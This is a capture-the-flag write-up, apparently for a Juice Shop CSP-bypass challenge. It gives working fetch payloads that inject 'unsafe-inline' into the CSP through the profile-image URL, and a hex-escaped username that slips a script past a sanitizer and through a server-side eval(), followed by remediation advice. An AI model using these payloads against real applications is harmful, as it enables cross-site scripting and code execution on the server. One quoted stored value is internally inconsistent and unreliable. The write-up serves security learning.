### **Methodology**

1. **Reconnaissance**
   - Identified the challenge as a CSP bypass requiring the payload `<script>alert(`xss`)</script>` on the legacy `/profile` page.

2. **Source Code Analysis**
   - Checked `routes/userProfile.ts` on GitHub to understand how the profile page is rendered.
   - Found two critical elements:
     - The CSP header is dynamically generated from the user's `profileImage` field:
       ```js
       const CSP = `img-src 'self' ${user?.profileImage}; script-src 'self' 'unsafe-eval'`
       ```
     - The challenge triggers only when both conditions are met simultaneously:
       ```js
       challengeUtils.solveIf(challenges.usernameXssChallenge, () => {
         return username &&
           user?.profileImage.match(/;[ ]*script-src(.)*'unsafe-inline'/g) !== null &&
           utils.contains(username, '<script>alert(`xss`)</script>')
       })
       ```

3. **CSP Injection via profileImage**
   - Set the profile image URL to inject `unsafe-inline` into the CSP header, disabling script execution restrictions:
     ```js
     fetch('/profile/image/url', {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       credentials: 'include',
       body: "imageUrl=https://placekitten.com/400/400; script-src 'self' 'unsafe-inline'"
     })
     ```
   - This causes the server to emit the following CSP header:
     ```
     img-src 'self' https://placekitten.com/400/400; script-src 'self' 'unsafe-inline'
     ```
   - With `unsafe-inline` allowed, inline `<script>` tags can now execute freely.

4. **Sanitizer Analysis**
   - Found in `lib/insecurity.ts` that the username setter uses `sanitizeLegacy`:
     ```js
     export const sanitizeLegacy = (input = '') => input.replace(/<(?:\w+)\W+?[\w]/gi, '')
     ```
   - This regex strips `<tagname` + non-word chars + first word char, making direct `<script>alert(...)` injection impossible at storage time.

5. **SSTI Bypass via Pug Template Injection**
   - Found in `routes/userProfile.ts` that usernames matching `#{...}` are evaluated via `eval()` **after** being retrieved from the database:
     ```js
     if (username?.match(/#{(.*)}/) !== null) {
       const code = username?.substring(2, username.length - 1)
       username = eval(code)
     }
     ```
   - Storing `#{...}` in the username causes the eval to run at render time — after the sanitization setter has already passed.

6. **Hex Encoding Bypass**
   - Since `sanitizeLegacy` strips `<script>a` at storage time, the payload uses JavaScript hex escape sequences inside the SSTI block.
   - The sanitizer sees no `<` characters in the stored string, and `eval()` converts the hex escapes to the actual characters at render time:
     ```js
     fetch('/profile', {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       credentials: 'include',
       body: "username=#{'\\x3cscript\\x3ealert(`xss`)\\x3c/script\\x3e'}"
     })
     ```
   - `\x3c` = `<`, `\x3e` = `>`
   - Stored in DB: `#{'\\x3cscript\\x3ealert('xss')\x3c/script\x3e'}` — no `<` to trigger the sanitizer.
   - At render time: `eval(...)` returns `<script>alert('xss')</script>`.

7. **Validation**
   - Visiting `/profile` with both conditions met (injected CSP + hex-decoded script payload) triggered the challenge as solved.

8. **Tools Used**
   - **Browser DevTools** (console, Network tab)
   - **GitHub Source Code Review** (to understand the sanitizer and SSTI mechanism)
   - **JavaScript `fetch` API** (for injecting the CSP and the username payload)

---
### **Vulnerabilities**

1. **Vulnerability Name**
   - **CSP Header Injection via user-controlled `profileImage` field** (CWE-116), **Server-Side Template Injection (SSTI) via `eval()` on username** (CWE-94), and **Insufficient Input Sanitization bypassable via hex encoding** (CWE-79)

2. **Affected Components**
   - **`/profile` Legacy Page**, `routes/userProfile.ts`, `lib/insecurity.ts`, `sanitizeLegacy` function

3. **Severity Level**
   - **Critical**
     - Three vulnerabilities chain together: CSP injection disables the browser's primary XSS defense, SSTI via `eval()` allows server-side JavaScript execution, and the hex encoding bypass defeats the input sanitizer.
     - SSTI can be escalated beyond XSS to arbitrary server-side code execution.

---
### **Risks**

1. **Business Impact**
   - **Full Script Execution Bypass**: Injecting `unsafe-inline` into the CSP completely neutralizes the browser's primary XSS defense for all users viewing the profile page.
   - **Server-Side Code Execution**: The `eval()` SSTI vulnerability allows arbitrary JavaScript execution on the server, not just in the browser — this could be escalated to read environment variables, access the filesystem, or exfiltrate sensitive data.
   - **Account Takeover**: With inline scripts executing freely, session tokens can be stolen from any user who visits the compromised profile page.
   - **Reputational and Legal Damage**: A CSP bypass combined with SSTI is a critical severity finding indicating fundamental security design flaws, with potential GDPR implications.

2. **Exploitation Potential**
   - The three-stage chain (CSP injection → SSTI → hex bypass) is complex but entirely achievable by a motivated attacker with source code access.
   - SSTI via `eval()` is particularly dangerous as it can be escalated to Remote Code Execution (RCE) depending on the Node.js environment configuration.

---
### **Actions**

#### **Risk Mitigation Strategies**
- Never interpolate user-controlled data directly into security headers — the `profileImage` URL must be validated before being included in the CSP.
- Remove the `eval()`-based SSTI mechanism from `userProfile.ts` entirely — there is no legitimate reason to evaluate user-supplied username content as JavaScript.
- Replace `sanitizeLegacy` with `sanitizeSecure` or a proper allowlist-based HTML sanitizer that also decodes escape sequences before sanitizing.

#### **Remediation Fixes**
- In `routes/userProfile.ts`, validate that `profileImage` is a valid URL and strip any content after a semicolon before including it in the CSP.
- Remove the `#{...}` SSTI evaluation block entirely. Use Pug's built-in safe interpolation (`=` instead of `!=`) for dynamic username rendering.
- Apply `sanitizeSecure` consistently across all user input fields instead of `sanitizeLegacy`.
- Set a static, strict CSP header server-side rather than generating it dynamically from user data.

#### **Best Security Practices**
- Security headers must never be derived from user-controlled input — CSP headers should be static or generated from a trusted, server-controlled configuration.
- Never use `eval()` on user-supplied data under any circumstances.
- Apply defense in depth: multiple independent security controls should each be sufficient on their own, so that bypassing one does not compromise the entire system.
- **Reference**: [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html), [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
